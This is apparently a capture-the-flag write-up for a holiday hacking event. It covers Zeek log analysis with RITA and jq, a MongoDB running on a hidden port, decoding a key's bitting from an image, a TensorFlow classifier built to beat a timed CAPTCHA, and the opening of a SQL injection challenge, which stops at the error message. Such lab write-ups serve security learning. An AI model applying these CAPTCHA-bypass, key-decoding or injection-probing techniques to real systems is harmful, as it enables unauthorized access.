<h2 id="rita---real-intelligence-threat-analytics">RITA - Real Intelligence Threat Analytics</h2>
<ul>
<li><a href="https://www.youtube.com/watch?v=jxOZ5u2CYWw">RITA Youtube</a></li>
<li><a href="https://www.youtube.com/embed/JoWzkcEotA8?start=63&amp;feature=oembed">RITA demo Youtube</a></li>
<li><a href="https://www.activecountermeasures.com/free-tools/rita/">RITA website</a></li>
<li><a href="https://github.com/activecm/rita">GIT</a></li>
</ul>
<p>According to website, The framework ingests Bro/Zeek Logs, and currently supports the following major features:</p>
<ul>
<li>Beaconing Detection: Search for signs of beaconing behavior in and out of your network</li>
<li>DNS Tunneling Detection: Search for signs of DNS based covert channels</li>
<li>Blacklist Checking: Query blacklists to search for suspicious domains and hosts</li>
</ul>
<p>To setup our environment, we download the logs and RITA framework:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl -Ok https://downloads.elfu.org/elfu-zeeklogs.zip
unzip elfu-zeeklogs.zip
git clone https://github.com/activecm/rita.git
<span style="color:#8be9fd;font-style:italic">cd</span> rita
sudo ./install.sh --disable-bro --disable-mongo
<span style="color:#6272a4"># we start a mongodb container in a new docker-machine,</span>
<span style="color:#6272a4"># then we edit the config file with the mongodb ip address</span>
docker run -p 27017:27017 -d --name some-mongo <span style="color:#f1fa8c">\
</span><span style="color:#f1fa8c"></span>    -e <span style="color:#8be9fd;font-style:italic">MONGO_INITDB_ROOT_USERNAME</span><span style="color:#ff79c6">=</span>mongoadmin <span style="color:#f1fa8c">\
</span><span style="color:#f1fa8c"></span>    -e <span style="color:#8be9fd;font-style:italic">MONGO_INITDB_ROOT_PASSWORD</span><span style="color:#ff79c6">=</span>secret <span style="color:#f1fa8c">\
</span><span style="color:#f1fa8c"></span>    mongo:3.6.18
sudo apt-get install nmap
nmap -p27017 192.168.99.106
<span style="color:#6272a4"># We edit the ConnectionString http://username:password@docker-machine:27017</span>
vi /etc/rita/config.yaml
rita import ../elfu-zeeklogs elfu
rita show-databases
rita show-beacons elfu -H | head -20
</code></pre></td></tr></table>
</div>
</div><p>The first entry with ip address <code>192.168.134.130</code> is having the highest score, which is an indicator of compromission (IoC)</p>
<h2 id="mongo-challenge">Mongo challenge</h2>
<p>Running <code>mongo</code>, we get a hint that mongodb might not be running on the default port
Let&rsquo;s find the process running mongod daemon</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">elf@69f7899a75ea:~$ ps -aef
UID        PID  PPID  C STIME TTY          TIME CMD
elf          <span style="color:#bd93f9">1</span>     <span style="color:#bd93f9">0</span>  <span style="color:#bd93f9">0</span> 06:22 pts/0    00:00:00 /bin/bash
mongo        <span style="color:#bd93f9">9</span>     <span style="color:#bd93f9">1</span>  <span style="color:#bd93f9">3</span> 06:22 ?        00:00:01 /usr/bin/mongod --quiet --fork --port <span style="color:#bd93f9">121</span>
</code></pre></td></tr></table>
</div>
</div><p>Mongo is running on port 121 so we try <code>mongo --port 121</code> however it does not work, so we check for pid=9 in /proc</p>
<pre tabindex="0"><code>elf@d94aef4ea2f0:~$ cat /proc/9/cmdline
/usr/bin/mongod--quiet--fork--port12121--bind_ip127.0.0.1--logpath=/tmp/mongo.log
</code></pre><p>Much better, we see port is 12121 with some /tmp/mongo.log :)</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">show databases
use elfu
db<span style="color:#ff79c6">.</span>getCollectionNames()
<span style="color:#6272a4">#There is a collection named &#39;solution&#39;</span>
db<span style="color:#ff79c6">.</span>solution<span style="color:#ff79c6">.</span>count()
<span style="color:#6272a4">#only one object in this collection</span>
db<span style="color:#ff79c6">.</span>solution<span style="color:#ff79c6">.</span>findOne()
<span style="color:#6272a4">#solution is:  &#34;_id&#34; : &#34;You did good! Just run the command between the stars: ** db.loadServerScripts();displaySolution(); **&#34;</span>
db<span style="color:#ff79c6">.</span>loadServerScripts();displaySolution();
</code></pre></td></tr></table>
</div>
</div><p>We get a nice ASCII art Christmas tree with a Congratulation message</p>
<h2 id="wunorse-openslae---zeek-logs-challenge">Wunorse Openslae - Zeek Logs challenge</h2>
<p>We will use jq for this challenge and follow the instructions from SANS website to <a href="https://pen-testing.sans.org/blog/2019/12/03/parsing-zeek-json-logs-with-jq-2">Parsing Zeek JSON Logs with JQ</a></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json"><span style="color:#bd93f9">7</span>b<span style="color:#bd93f9">17</span>d<span style="color:#bd93f9">5</span>dab<span style="color:#bd93f9">0</span>:~$ cat conn.log | jq -s &#39;sort_by(.duration) | reverse | .[<span style="color:#bd93f9">0</span>]&#39;
{
  <span style="color:#ff79c6">&#34;ts&#34;</span>: <span style="color:#f1fa8c">&#34;2019-04-18T21:27:45.402479Z&#34;</span>,
  <span style="color:#ff79c6">&#34;uid&#34;</span>: <span style="color:#f1fa8c">&#34;CmYAZn10sInxVD5WWd&#34;</span>,
  <span style="color:#ff79c6">&#34;id.orig_h&#34;</span>: <span style="color:#f1fa8c">&#34;192.168.52.132&#34;</span>,
  <span style="color:#ff79c6">&#34;id.orig_p&#34;</span>: <span style="color:#bd93f9">8</span>,
  <span style="color:#ff79c6">&#34;id.resp_h&#34;</span>: <span style="color:#f1fa8c">&#34;**13.107.21.200**&#34;</span>,
  <span style="color:#ff79c6">&#34;id.resp_p&#34;</span>: <span style="color:#bd93f9">0</span>,
  <span style="color:#ff79c6">&#34;proto&#34;</span>: <span style="color:#f1fa8c">&#34;icmp&#34;</span>,
  <span style="color:#ff79c6">&#34;duration&#34;</span>: <span style="color:#bd93f9">1019365.337758</span>,
  <span style="color:#ff79c6">&#34;orig_bytes&#34;</span>: <span style="color:#bd93f9">30781920</span>,
  <span style="color:#ff79c6">&#34;resp_bytes&#34;</span>: <span style="color:#bd93f9">30382240</span>,
  <span style="color:#ff79c6">&#34;conn_state&#34;</span>: <span style="color:#f1fa8c">&#34;OTH&#34;</span>,
  <span style="color:#ff79c6">&#34;missed_bytes&#34;</span>: <span style="color:#bd93f9">0</span>,
  <span style="color:#ff79c6">&#34;orig_pkts&#34;</span>: <span style="color:#bd93f9">961935</span>,
  <span style="color:#ff79c6">&#34;orig_ip_bytes&#34;</span>: <span style="color:#bd93f9">57716100</span>,
  <span style="color:#ff79c6">&#34;resp_pkts&#34;</span>: <span style="color:#bd93f9">949445</span>,
  <span style="color:#ff79c6">&#34;resp_ip_bytes&#34;</span>: <span style="color:#bd93f9">56966700</span>
}
elf@ba<span style="color:#bd93f9">7</span>b<span style="color:#bd93f9">17</span>d<span style="color:#bd93f9">5</span>dab<span style="color:#bd93f9">0</span>:~$ runtoanswer
[...]
What is the destination IP address with the longes connection duration? ** <span style="color:#bd93f9">13.107</span>.<span style="color:#bd93f9">21.200</span> **
[...]
Congratulations
</code></pre></td></tr></table>
</div>
</div><h2 id="get-access-to-the-steam-tunnels">Get access to the steam tunnels</h2>
<ul>
<li><a href="https://youtu.be/KU6FJnbkeLA">Optical decoding of key bitting</a></li>
<li><a href="https://github.com/deviantollam/decoding">Deviant&rsquo;s Key Decoding templates</a></li>
</ul>
<p>Near the grinder machine we find Krampus who is wearing the key. Looking at the <code>DevTools Network</code> tab,
we can capture the png file that contains the key picture.
Then we use gimp together with guides downloaded from Deviant&rsquo;s github.
Using <code>gimp</code> we decode the following bitting: 12252</p>
<p>I was not accessible to use the machine to produce the key,
but could figure out from source code the url based should looks like <a href="https://key.elfu.org/backend/keys/SC4_preview/12252?.png">https://key.elfu.org/backend/keys/SC4_preview/12252?.png</a></p>
<p>The server always complaining of an invalid bitting length,
I have therefore generated two keys with a zero at the beginning or at end of the code
to retrieve the key from the server with the following url <code>https://key.elfu.org/backend/keys/SC4_preview/122520.png</code></p>
<p>We now have access to the Steam tunnels and we can speak with Krampus who reveal his name and admit having &ldquo;borrowed&rdquo; the two turtle doves.</p>
<p>Objective completed with answer <strong>Krampus Hollyfeld</strong></p>
<h2 id="frido-sleigh-contest-objective-8">Frido Sleigh contest (Objective 8)</h2>
<p>This is about machine learning image recognition with Tensorflow</p>
<p>This challenge is open to elves, not to human &hellip;
so naturally, we have to submit a CAPTEHA which is a CAPTCHA-equivalent technology to prove we are &lsquo;not&rsquo; a human</p>
<p><strong>Loool! I love the creativity of those challenges makers.</strong></p>
<p>Indeed the challenge cannot be done manually by a human on the website
because the CAPTEHA is only visible 5 seconds with too many images to classify.
So the solution is to use instead the API and build an image recognition classifier model
using tensorflow to mimic the speed and efficacy of elves.</p>
<ul>
<li>resources:
<ul>
<li><a href="https://fridosleigh.com/">https://fridosleigh.com/</a></li>
<li><a href="https://downloads.elfu.org/capteha_images.tar.gz">catalog of 12,000 images</a></li>
<li><a href="https://downloads.elfu.org/capteha_api.py">API interface</a></li>
<li><a href="https://youtu.be/jmVPLwjm_zs">Image recognition Youtube</a> Machine Learning Use Cases for Cybersecurity from <a href="https://twitter.com/christojdav">Chris Davis</a></li>
<li><a href="https://github.com/chrisjd20/img_rec_tf_ml_demo">git hub</a> Image Recognition Using TensorFlow Machine Learning Demo to recognize Apples from Bananas</li>
</ul>
</li>
</ul>
<p>We download and untar a bank of 12,000 images of Candy Canes, Christmas Trees, Ornaments, Presents, Santa Hats, Stockings.
I believe we have to build a model to by-pass a captcha.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mkdir capteha_images
<span style="color:#8be9fd;font-style:italic">cd</span> capteha_images
curl -Ok https://downloads.elfu.org/capteha_images.tar.gz
tar -xvzf capteha_images.tar.gz
</code></pre></td></tr></table>
</div>
</div><p>We also download the capteha_api.py which contains source code to connect to the server without doing it manually on the website &hellip;
however some code is missing and the python file provide a big hint: <code>MISSING IMAGE PROCESSING AND ML IMAGE PREDICTION CODE GOES HERE</code></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#6272a4"># Tensorflow==1.15 is not available for python 3.8 so we downgrade to python3.7</span>
<span style="color:#6272a4"># https://pypi.org/project/tensorflow/1.15.0/#files</span>
sudo apt-get install python3.7
virtualenv -p /usr/bin/python3.7 venv
<span style="color:#8be9fd;font-style:italic">source</span> venv/bin/activate
python3 -m pip install --upgrade pip
python3 -m pip install --upgrade setuptools
python3 -m pip install --upgrade <span style="color:#8be9fd;font-style:italic">tensorflow</span><span style="color:#ff79c6">==</span>1.15
python3 -m pip install --upgrade tensorflow_hub
</code></pre></td></tr></table>
</div>
</div><p>We can then start to train our dataset. Assuming our training data is in the folder &lsquo;capteha_images&rsquo;,
we have to copy subfolders named according to each class of image (Candy Canes, Christmas Trees, Ornaments, Presents, Santa Hats, Stockings).
This is the way our Tensorflow script identifies the label of the images during training phase.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#8be9fd;font-style:italic">time</span> python3 retrain.py --image_dir ./capteha_images/
</code></pre></td></tr></table>
</div>
</div><p>It&rsquo;s very long (65 min for below 12000 images) &hellip;
so better go supermarket and buy 1 kg yoghourt or move to another challenge or write-up or audit the code while this is training ;)
Once trained, a graph model is created in a form of a file.
We want to test the accuracy of our model with the below command</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">./predict_images_using_trained_model.py
</code></pre></td></tr></table>
</div>
</div><p>Looking at the devtools, when clicking the capteha, an api request call to /api/capteha/request is being done to retrieve the images
in a form of a json array (called &lsquo;images&rsquo;) of K-V pairs (uuid; base64).</p>
<p>uuid is the unique id for the image and base64 is the image representation in base64)</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#39;{&#34;images&#34;:[{&#34;base64&#34;:&#34;iVBORw0KGgoAAAANSUhEUgAAAH4AA[...]AAAElFTkSuQmCC&#34;,&#34;uuid&#34;:&#34;bb4f0837-e584-11e9-97c1-309c23aaf0ac&#34;},{&#34;base64&#34;:&#34;iVBORw0KGgoAAAANSUhEUgAAAIIAAACCCAY[...]AABJRU5ErkJggg==&#34;,&#34;uuid&#34;:&#34;bb966602-e584-11e9-97c1-309c23aaf0ac&#34;}]}&#39;</span> | jq
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
  <span style="color:#ff79c6">&#34;images&#34;</span>: [
    {
      <span style="color:#ff79c6">&#34;base64&#34;</span>: <span style="color:#f1fa8c">&#34;iVBORw0KGgoAAAANSUhEUgAAAH4AA[...]AAAElFTkSuQmCC&#34;</span>,
      <span style="color:#ff79c6">&#34;uuid&#34;</span>: <span style="color:#f1fa8c">&#34;bb4f0837-e584-11e9-97c1-309c23aaf0ac&#34;</span>
    },
    {
      <span style="color:#ff79c6">&#34;base64&#34;</span>: <span style="color:#f1fa8c">&#34;iVBORw0KGgoAAAANSUhEUgAAAIIAAACCCAY[...]AABJRU5ErkJggg==&#34;</span>,
      <span style="color:#ff79c6">&#34;uuid&#34;</span>: <span style="color:#f1fa8c">&#34;bb966602-e584-11e9-97c1-309c23aaf0ac&#34;</span>
    }
  ]
}
</code></pre></td></tr></table>
</div>
</div><p>The rest of the capteha response payload is unfortunately truncated by devtools,
so to get the full payload we will probably need something like Burp-suite or custom python code.
Never-mind, challenge developers had the kindness to develop for us the capteha-api.py
which contains the code we are interesting to analyze the capteha requests.
I am actually running this code to observe the response payload in detail.
I modify the python script to use the ML predictions, and execute:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">TODO: put code here
</code></pre></td></tr></table>
</div>
</div><p>No luck, my docker machine is not very powerful and it takes 35 seconds to execute and predict very accurately all images.</p>
<p>I need to find a way to do it more effectively and below the 5 seconds time out!
maybe the image bank is limited and we can exhaust the bank by keeping a hash of all uuid we have previously figure-out the class?</p>
<p>Actually, only the first part of the uuid needs to be used as a key for our dictionary.</p>
<p>Well, after dozen runs and about 10k images hash generated,
My cache (a simple python dictionary) has never been hit :( !!!</p>
<p>Either the image bank is huge or there is a slight and unexpensive random transformation
to prevent me to build a rainbow table of K-V pairs (K=hash of the base64 image, V=image class guessed by Tensorflow).</p>
<p>So I try to move on another technique that consists to use the GPU instead of the CPU.
However again, I am not lucky, my laptop is using an <code>Intel HD graphics</code>
which is in my understanding a virtual GPU embedded in the CPU &hellip; with terrible performance &hellip;</p>
<p>so lessons learnt is you have to be a gamer when you want to do ML.</p>
<p>Actually this statement is not true, someone in the forum suggested to move on <code>Google Colab</code> which allows to use TensorFlow with GPU for free!
It is a completely new journey I want to try.</p>
<p>My source code needed few adjustements and I built the following two python notebook :</p>
<ul>
<li><a href="./retrain.ipynb">retrain.ipynb</a></li>
<li><a href="./predict.ipynb">predict.ipynb</a></li>
</ul>
<p>Google Tensorflow with GPU enabled are abolutely fantastic as it could classify all 100 images in a blink.
Then the challenge answer is received on my email address.</p>
<h2 id="student-portal">Student Portal</h2>
<p>resources:</p>
<ul>
<li><a href="https://studentportal.elfu.org/">Student portal</a></li>
<li><a href="https://github.com/sqlmapproject/sqlmap/wiki/Techniques">Sqlmap</a></li>
<li><a href="https://pen-testing.sans.org/blog/2017/10/13/sqlmap-tamper-scripts-for-the-win">sqlmap tamper scripts</a></li>
</ul>
<p>Hints: Pepper Mint informed us that a SQLI attack may work.
I first click on &lsquo;apply now&rsquo; and fill in the form with a quote caracter in the firstname to get the below error message:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
